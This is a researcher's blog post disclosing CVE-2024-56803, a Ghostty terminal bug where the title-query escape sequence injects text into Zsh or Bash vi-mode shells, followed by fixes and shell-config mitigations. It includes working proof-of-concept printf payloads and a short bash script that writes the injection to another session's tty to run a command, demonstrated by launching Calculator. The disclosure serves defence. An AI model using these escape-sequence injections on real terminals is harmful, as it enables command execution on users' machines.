<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://dgl.cx/2024/12/ghostty-terminal-title">Original</a>
    <h1>Déjà vu: Ghostly CVEs in my terminal title</h1>
    
    <div id="readability-page-1" class="page"><div>
          <p><em>Exploring a security bug in Ghostty that is eerily familiar.</em></p>
<p>As I&#39;ve <a href="https://www.youtube.com/watch?v=4kfDBNzStbs&amp;themeRefresh=1">spoken</a>
and <a href="https://dgl.cx/2023/09/ansi-terminal-security">written</a> about all modern
terminals are actually &#34;emulating&#34; something dating from the 1970s.</p>
<p>The full details are surprisingly complex and having a standard building block
for these things is important. We can probably do better, but it&#39;s hard to
change something so fundamental.</p>
<p>In Feburary 2003 HD Moore published a paper to bugtraq called <a href="https://seclists.org/bugtraq/2003/Feb/315">&#34;Terminal
Emulator Security Issues&#34;</a>.</p>
<p>On the 26<sup>th</sup> December 2024 Mitchell Hashimoto released <a href="https://ghostty.org/">Ghostty
1.0</a>. A new terminal emulator. The name even has a little
nod to the &#34;tty&#34; of old. I instantly tried it out and ran my terminal tester on
it:</p>
<p><img src="https://dgl.cx/2024/12/termtest-ghostty.png"/></p><p>Oh dear.</p>
<p>That 2003 CVE is indeed <a href="https://nvd.nist.gov/vuln/detail/CVE-2003-0063">the one</a> HD Moore found many years ago. The new issue has been assigned <a href="https://github.com/ghostty-org/ghostty/security/advisories/GHSA-5hcq-3j4q-4v6p">CVE-2024-56803</a>.</p>
<h2>Why are we here again?</h2>
<p>First of all, given the number of terminals which have been affected by this,
this is clearly a fundamental issue.</p>
<p>The fundamental problem is that terminals use in-band signalling, that is
the ASCII escape character escapes from the mode the terminal is usually in
(printing text) and starts handling the input to it as something else. These
other things are known as escape sequences and they can change the colour or
ask the terminal to do various control things.</p>
<p>One of those control things is setting the title. That&#39;s useful, when you run
<code>cd</code> in your shell, it&#39;s quite nice the title of the window or tab updates so
you know which directory a particular terminal is in. However there is also a
sequence to query the title. These &#34;query&#34; sequences are particularly
problematic when combined with the in-band signalling nature of a terminal, if
the program running inside the terminal does not expect a reply at that moment,
it may handle it differently, or even treat it as user input.</p>
<p>In general any reply where the user can control the data should be considered
very carefully. Most terminals therefore disable title reporting by default or
even don&#39;t implement it. (A <a href="https://vin01.github.io/piptagole/escape-sequences/iterm2/rce/2024/06/16/iterm2-rce-window-title-tmux-integration.html">recent iTerm2
bug</a>
was a regression around the configuration option itself to disable it.)</p>
<p>In 2022 I discovered a <a href="https://www.openwall.com/lists/oss-security/2022/11/10/1">bug in
xterm</a> where the font
query could be used to inject user controllable text. This only worked on Zsh
and made use of the fact the &#34;Escape&#34; used as part of the escape sequence is
also the key you press to leave insert mode and enter the Vi normal mode.</p>
<h2>The Ghostty variant</h2>
<p>It turns out with Ghostty we can do something very similar to the xterm issue, in Zsh with vi mode enabled (<code>set -o vi</code>), simply outputting this sequence to the screen:</p>
<pre><code>printf &#39;\e]0;iopen -a Calculator\a\e[21t\e]0;:accept-line\a\e[21t&#39;
</code></pre>
<p>Results in it opening calculator (on macOS):</p>
<p><img src="https://dgl.cx/2024/12/ghostty-zsh-calc.jpg"/></p><p>All <a href="https://github.com/zsh-users/zsh/commit/03f52f1da6a41529982482442360c9378211b4ce">released versions</a> of Zsh have a behaviour that they default the keymap to vi if the <code>$EDITOR</code> or <code>$VISUAL</code> environment variables contain &#34;vi&#34;. So this is quite a common setup for users. This default has been removed after Zsh 5.9, but that is not yet released.</p>
<p>Bash with <code>set -o vi</code>:</p>
<pre><code>printf &#39;\e]0;iopen -a Calculator\a\e[21t\e]0;vZZ\a\e[21t&#39;
</code></pre>
<p><img src="https://dgl.cx/2024/12/ghostty-bash-calc.jpg"/></p><p>Unlike Zsh this setting does have to be enabled by the user, so is likely to be a less common configuration.</p>
<h2>But is this an RCE?</h2>
<p><em>Spoiler: Yes</em></p>
<p>One aspect of this attack that isn&#39;t immediately clear is the input goes via your terminal, so it&#39;s like you typed it, even if you&#39;re connected to a remote system via SSH. If the remote system is compromised, it can decide it isn&#39;t interested in your input and make it get buffered, with it probably getting delivered locally.</p>
<p>We can demonstrate this with a simple script that stops the shell. In this case
I run it as another session of the user, but it could also be run via root on a
remote system if the system is compromised.</p>

<div data-id="SVYaMUpX3vM" onclick="if (!this.querySelector(&#34;iframe&#34;)) this.innerHTML = `&lt;iframe width=1200 height=600 title=&#34;${this.querySelector(&#34;.yt-title&#34;).textContent}&#34; frameborder=0 allow=&#34;autoplay; clipboard-write; encrypted-media; picture-in-picture;&#34; allowfullscreen=&#34;&#34; src=&#34;https://www.youtube-nocookie.com/embed/${this.dataset.id}?autoplay=1&amp;rel=0&#34;&gt;&lt;/iframe&gt;`;">
  <p><img src="https://dgl.cx/2024/12/yt-SVYaMUpX3vM.jpg"/></p><p>SSH disconnect attack on Ghostty 1.0.0</p>
  <p>▶️
    
  </p>
</div>
<p>The &#34;disconnect-ghosty&#34; script used in the demo is below:</p>
<pre><code>#!/bin/bash
# David Leadbeater, 2024. http://©.st/dgl
pid=${1:?$&#39;\e&#39;&#34;[GUsage: $0 pid-of-shell&#34;}

tty=&#34;/dev/$(ps -otty -p$pid | tail -1)&#34;

kill -STOP $pid
printf &#39;\e]0;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxiopen -a Calculator\a\e[21t\e[21t\e]0;:accept-line\a\e[21t&#39; &gt; $tty
kill -9 $pid
</code></pre>
<h2>Fixes and mitigations</h2>
<p>Ghostty <a href="https://ghostty.org/docs/install/release-notes/1-0-1">1.0.1</a> is out now, <a href="https://github.com/ghostty-org/ghostty/commit/25a4a89ee3d31e35148d7e75064214efe2a057a1">fixing this</a> (by making it configurable and disabling it by default).</p>
<p>If for some reason you can&#39;t upgrade, the <a href="https://github.com/ghostty-org/ghostty/security/advisories/GHSA-5hcq-3j4q-4v6p">advisory</a> has a workaround where a fixed title will not let an attacker control the value reported back.</p>
<p>An alternative is to put the following in your <code>~/.zshrc</code>:</p>
<pre><code>function skip-osc-sequence() {
  local key
  while read -sk key &amp;&amp; (( $((#key)) != 0x1B &amp;&amp; $((#key)) != 0x07 )); do
    # empty body
  done
  if [[ $((#key)) = 27 ]]; then
    # ^[\
    read -sk key
  fi
}

zle -N skip-osc-sequence
bindkey &#39;\e]&#39; skip-osc-sequence
</code></pre>
<p>This makes Zsh skip over OSC replies rather than treat them as input. This is only a mitigation and you should upgrade as there may still be cases where you could be attacked (e.g. with the remote attack over SSH, careful timing could lead to a &#34;torn&#34; read that may mean the local shell doesn&#39;t see the start of the OSC sequence). It also doesn&#39;t hurt to leave in your config, as it provides defense-in-depth.</p>
<p>Or if using bash, put this in <code>~/.inputrc</code>:</p>
<pre><code>&#34;\e]&#34;: skip-csi-sequence
&#34;\e\\&#34;: skip-csi-sequence
</code></pre>
<p>This isn&#39;t as complete as the Zsh mitigation, as you could still be blindly
tricked to press Enter and run an unexpected command, but it works for this
particular issue in Ghostty.</p>
<p>Please don&#39;t see this post as any kind of attack against Ghostty, remember it
just had a 1.0 release. I&#39;ve been using it and I&#39;m writing this very post in
it. The &#34;terminal inspector&#34; is very nice for people interested in diving into
the internals of their terminal. Thanks to Mitchell for the quick fix.</p>
<p>If you want to see more on this subject you might like my <a href="https://www.youtube.com/watch?v=iIHw0KWgzAs">Microsoft BlueHat
talk from 2023</a>, or my longer <a href="https://dgl.cx/2023/09/ansi-terminal-security">in
depth post</a> on various issues with terminals.</p>
<p><span>31<sup>st</sup> December 2024</span>
</p>

        </div></div>
  </body>
</html>
